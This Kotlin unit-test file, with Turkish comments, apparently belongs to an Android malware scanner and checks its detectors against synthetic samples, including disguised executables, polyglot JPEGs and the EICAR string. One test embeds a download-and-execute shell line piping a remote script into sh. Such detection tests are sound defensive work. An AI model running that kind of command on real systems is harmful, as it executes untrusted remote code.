package com.nexguard.feature.scan.detection

import com.nexguard.core.common.Finding
import com.nexguard.core.common.RiskScorer
import com.nexguard.core.common.Severity
import com.nexguard.core.common.Verdict
import kotlinx.coroutines.runBlocking
import org.junit.After
import org.junit.Assert.assertEquals
import org.junit.Assert.assertFalse
import org.junit.Assert.assertNotNull
import org.junit.Assert.assertTrue
import org.junit.Test
import java.io.File
import java.security.MessageDigest
import java.util.UUID

/**
 * Dedektör sezgilerinin yanlış pozitif/negatif matrisi.
 * Örnekler sentetiktir; gerçek zararlı yazılım içermez.
 */
class DetectorHeuristicsTest {

    private val tempDir = File(System.getProperty("java.io.tmpdir"), "ng-det-${UUID.randomUUID()}")
        .apply { mkdirs() }

    @After
    fun cleanup() {
        tempDir.deleteRecursively()
    }

    private val localDetectors = listOf(
        PrefilterDetector(), DocumentAnalyzer(), EntropyDetector(),
        StringIocDetector(), PeAnalyzer(), ScriptAnalyzer()
    )

    private fun target(name: String, bytes: ByteArray): ScanTarget {
        val f = File(tempDir, name)
        f.writeBytes(bytes)
        val sha = MessageDigest.getInstance("SHA-256").digest(bytes)
            .joinToString("") { "%02x".format(it) }
        return ScanTarget(
            path = f.absolutePath,
            file = f,
            sha256 = sha,
            size = bytes.size.toLong(),
            mtime = f.lastModified(),
            magic = bytes.copyOf(minOf(4, bytes.size)),
            sampleLimit = 4 * 1024 * 1024
        )
    }

    private fun inspectAll(t: ScanTarget): List<Finding> = runBlocking {
        localDetectors.flatMap { d ->
            try { d.inspect(t) } catch (e: Exception) { emptyList() }
        }
    }

    private fun jpegWith(body: ByteArray, trailer: ByteArray = byteArrayOf()): ByteArray {
        val header = byteArrayOf(
            0xFF.toByte(), 0xD8.toByte(), 0xFF.toByte(), 0xE0.toByte(),
            0x00, 0x10, 'J'.code.toByte(), 'F'.code.toByte(), 'I'.code.toByte(), 'F'.code.toByte(),
            0x00, 0x01, 0x01, 0x00, 0x00, 0x01, 0x00, 0x01, 0x00, 0x00
        )
        return header + body + byteArrayOf(0xFF.toByte(), 0xD9.toByte()) + trailer
    }

    @Test
    fun `clean jpeg produces no findings`() {
        val findings = inspectAll(target("foto.jpg", jpegWith("A".repeat(20_000).toByteArray())))
        assertTrue("Gerçek JPEG temiz sayılmalı: $findings", findings.isEmpty())
    }

    @Test
    fun `png renamed to jpg is not flagged`() {
        val png = byteArrayOf(0x89.toByte(), 'P'.code.toByte(), 'N'.code.toByte(), 'G'.code.toByte(),
            0x0D, 0x0A, 0x1A, 0x0A) + "B".repeat(4096).toByteArray()
        val findings = runBlocking { PrefilterDetector().inspect(target("resim.jpg", png)) }
        assertTrue("Yanlış etiketlenmiş PNG tehdit değil: $findings", findings.isEmpty())
    }

    @Test
    fun `webp renamed to jpg is not flagged`() {
        val webp = "RIFF".toByteArray() + byteArrayOf(0, 0, 0, 0) + "WEBPVP8 ".toByteArray() +
            "C".repeat(2048).toByteArray()
        val findings = runBlocking { PrefilterDetector().inspect(target("resim.jpeg", webp)) }
        assertTrue("Yanlış etiketlenmiş WebP tehdit değil: $findings", findings.isEmpty())
    }

    @Test
    fun `zip disguised as jpg is flagged`() {
        val zip = byteArrayOf(0x50, 0x4B, 0x03, 0x04) + "D".repeat(2048).toByteArray()
        val findings = runBlocking { PrefilterDetector().inspect(target("gizli.jpg", zip)) }
        assertTrue(
            "ZIP kılığındaki dosya işaretlenmeli: ${findings.map { it.ruleId }}",
            findings.any { it.ruleId == "ARCHIVE_DISGUISED" }
        )
    }

    @Test
    fun `executable disguised as jpg is critical`() {
        val mz = byteArrayOf(0x4D, 0x5A) + "E".repeat(4096).toByteArray()
        val findings = runBlocking { DocumentAnalyzer().inspect(target("foto.jpg", mz)) }
        val hit = findings.firstOrNull { it.ruleId == "EXECUTABLE_DISGUISED" }
        assertNotNull("MZ kılığındaki görsel yakalanmalı", hit)
        assertEquals(Severity.CRITICAL, hit!!.severity)
    }

    @Test
    fun `text renamed to jpg stays below suspicious threshold`() {
        val text = "merhaba dünya\n".repeat(200).toByteArray()
        val findings = runBlocking { PrefilterDetector().inspect(target("notlar.jpg", text)) }
        val mismatch = findings.firstOrNull { it.ruleId == "EXT_MAGIC_MISMATCH" }
        assertNotNull("Uyuşmazlık kaydı görünmeli", mismatch)
        assertTrue("Tek zayıf sinyal 30 puanın altında olmalı", mismatch!!.weight < 30)
        val (score, verdict) = RiskScorer.evaluate(findings)
        assertTrue("Skor eşiğin altında: $score", score < 30)
        assertEquals(Verdict.CLEAN, verdict)
    }

    @Test
    fun `jpeg with appended zip payload is detected`() {
        val appended = byteArrayOf(0x50, 0x4B, 0x03, 0x04) + "Z".repeat(1024).toByteArray()
        val file = jpegWith("F".repeat(8192).toByteArray(), appended)
        val findings = runBlocking { DocumentAnalyzer().inspect(target("polyglot.jpg", file)) }
        assertTrue(
            "Görsel sonuna eklenmiş ZIP yakalanmalı: ${findings.map { it.ruleId }}",
            findings.any { it.ruleId == "EMBEDDED_AFTER_IMAGE" }
        )
    }

    @Test
    fun `jpeg with appended payload inside random body is not double counted`() {
        val body = ByteArray(4096) { (it * 37 % 251).toByte() }
        val findings = runBlocking { DocumentAnalyzer().inspect(target("normal.jpg", jpegWith(body))) }
        assertTrue("Ek yük yok: ${findings.map { it.ruleId }}", findings.none { it.ruleId == "EMBEDDED_AFTER_IMAGE" })
    }

    @Test
    fun `binary container with cmd token does not trigger ioc`() {
        val binary = ByteArray(8192) { 0 }.also { b ->
            val token = "cmd.exe".toByteArray()
            token.copyInto(b, 512)
        }
        val findings = runBlocking { StringIocDetector().inspect(target("uygulama.apk", binary)) }
        assertTrue("İkili kapta komut tokeni yanlış alarm olmamalı: $findings", findings.isEmpty())
    }

    @Test
    fun `eicar test file is still detected`() {
        val eicar = "X5O!P%@AP[4\\PZX54(P^)7CC)7}" +
            "\$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!\$H+H*"
        val findings = runBlocking { StringIocDetector().inspect(target("eicar.com", eicar.toByteArray())) }
        assertTrue(
            "EICAR imzası hâlâ yakalanmalı: ${findings.map { it.ruleId }}",
            findings.any { it.ruleId == "EICAR_TEST" }
        )
    }

    @Test
    fun `script with download and execute is critical`() {
        val script = """
            #!/bin/sh
            curl -s http://example.com/x.sh | sh
        """.trimIndent()
        val findings = runBlocking { ScriptAnalyzer().inspect(target("kur.sh", script.toByteArray())) }
        assertTrue(
            "İndir-çalıştır betiği yakalanmalı: ${findings.map { it.ruleId }}",
            findings.any { it.ruleId == "SCRIPT_DOWNLOAD_EXEC" }
        )
    }

    @Test
    fun `apk container is not flagged for high entropy`() {
        val random = ByteArray(512 * 1024)
        java.util.Random(42).nextBytes(random)
        val findings = runBlocking { EntropyDetector().inspect(target("uygulama.apk", random)) }
        assertTrue("Sıkıştırılmış APK kabı entropi nedeniyle işaretlenmemeli: ${findings.map { it.ruleId }}", findings.isEmpty())
    }

    @Test
    fun `high entropy executable is still flagged`() {
        val random = ByteArray(512 * 1024)
        java.util.Random(7).nextBytes(random)
        // MZ başlığı + yüksek entropili gövde (paketlenmiş PE benzeri)
        val exe = byteArrayOf(0x4D, 0x5A) + random
        val findings = runBlocking { EntropyDetector().inspect(target("program.exe", exe)) }
        assertTrue(
            "Yüksek entropili çalıştırılabilir işaretlenmeli: ${findings.map { it.ruleId }}",
            findings.any { it.ruleId == "HIGH_ENTROPY" }
        )
    }

    @Test
    fun `file type sniffer recognizes common formats`() {
        assertEquals(ContentType.JPEG, FileTypeSniffer.sniff(jpegWith("A".repeat(64).toByteArray())))
        assertEquals(
            ContentType.PNG,
            FileTypeSniffer.sniff(byteArrayOf(0x89.toByte(), 'P'.code.toByte(), 'N'.code.toByte(), 'G'.code.toByte(),
                0x0D, 0x0A, 0x1A, 0x0A))
        )
        assertEquals(
            ContentType.MP4,
            FileTypeSniffer.sniff("....ftypisom".replace('.', '\u0000').toByteArray())
        )
        assertEquals(ContentType.TEXT, FileTypeSniffer.sniff("merhaba".toByteArray()))
        assertEquals(ContentType.PE, FileTypeSniffer.sniff(byteArrayOf(0x4D, 0x5A, 0x00, 0x00)))
        assertFalse(FileTypeSniffer.sniff(byteArrayOf(0x00, 0x01, 0x02, 0x03)).isImage)
    }

    @Test
    fun `hidden cache directories and files are skipped`() {
        assertTrue(ScanPolicy.shouldSkipDirectory("/storage/emulated/0/Pictures/.gs_fs0", ".gs_fs0"))
        assertTrue(ScanPolicy.shouldSkipFile(".0.jpg"))
        assertFalse(ScanPolicy.shouldSkipFile("foto.jpg"))
        assertFalse(ScanPolicy.shouldSkipDirectory("/storage/emulated/0/Download", "Download"))
    }
}
